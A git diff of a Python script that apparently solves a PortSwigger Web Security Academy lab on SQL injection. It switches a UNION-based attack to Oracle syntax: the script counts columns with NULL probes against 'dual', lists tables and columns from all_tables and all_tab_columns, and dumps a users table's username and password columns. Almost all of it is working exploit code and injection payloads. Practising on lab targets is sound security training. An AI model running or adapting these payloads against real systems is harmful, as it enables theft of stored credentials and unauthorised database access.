@@ -1,4 +1,4 @@
-# listing non-oracle dbms
+# listing oracle dbms
 from typing import Union
 from urllib.parse import quote, quote_plus
 
@@ -32,29 +32,29 @@ def get_col_nums(URL, max_col=10):
     for _ in range(max_col):
         PAYLOAD += "NULL, "
 
-        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + "--"))
+        response: r.Response = session.get(
+            URL + quote(PAYLOAD.strip(", ") + " FROM dual --")
+        )
 
         if response.status_code == 200:
             break
 
         count += 1
-    else:
-        return 0
 
     return count
 
 
 def main() -> None:
-    URL = "https://0a7d008303110c3c816da200006400df.web-security-academy.net/filter?category=Pets"
+    URL = "https://0a6000b50445b8518072127f00a1002e.web-security-academy.net/filter?category=Pets"
 
     # get tables with their schema names
     # PAYLOAD = (
     #     "' UNION SELECT "
     #     + ", ".join(
-    #         (cols := ["table_name", "table_schema"])
+    #         (cols := ["table_name", "NULL"])
     #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
     #     ).strip(", ")
-    #     + " FROM  information_schema.tables WHERE table_schema NOT IN ('pg_catalog', 'information_schema')--"
+    #     + " FROM all_tables--"
     # )
 
     # get a particular table's columns names;
@@ -64,17 +64,17 @@ def main() -> None:
     #         (cols := ["column_name", "NULL"])
     #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
     #     ).strip(", ")
-    #     + " FROM information_schema.columns WHERE table_name = 'users_swvftc'--"
+    #     + " FROM all_tab_columns WHERE table_name = 'USERS_VLJZDV'--"
     # )
 
-    # dump
+    # dump - USERS_VLJZDV
     PAYLOAD = (
         "' UNION SELECT "
         + ", ".join(
-            (cols := ["username_unjzya", "password_pntlii"])
+            (cols := ["USERNAME_INEZKH", "PASSWORD_IWBSSI"])
             + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
         ).strip(", ")
-        + " FROM public.users_swvftc WHERE username_unjzya = 'administrator'--"
+        + " FROM USERS_VLJZDV--"
     )
 
     response: r.Response = r.get(URL + PAYLOAD)
